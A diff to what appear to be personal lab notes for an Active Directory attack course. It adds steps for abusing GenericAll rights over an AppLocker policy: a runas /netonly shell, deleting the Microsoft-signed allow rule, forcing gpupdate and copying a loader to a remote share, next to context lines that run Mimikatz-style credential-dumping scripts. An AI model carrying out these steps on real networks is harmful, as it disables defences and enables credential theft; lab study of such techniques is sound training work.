@@ -66,3 +66,34 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneyc
 .\Invoke-MimiEx-keys.ps1
 .\Invoke-MimiEx-vault.ps1
 ```
+
+### Generic All over AppLocker Policy
+**This policy must apply to the machine**
+
+Open CMD as user with rights
+```powershell
+runas /user:dcorp\srvadmin /netonly cmd
+```
+
+Open Group Policy editor
+```powershell
+gpmc.msc
+```
+
+Edit Policy
+![[Pasted image 20250507064108.png]]
+
+Policies -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker
+
+Executable rules, delete `Allow - Everyone - Signed by MS`
+
+
+Force update on compromised machines
+```powershell
+gpupdate /force
+```
+
+```powershell
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
+```
+
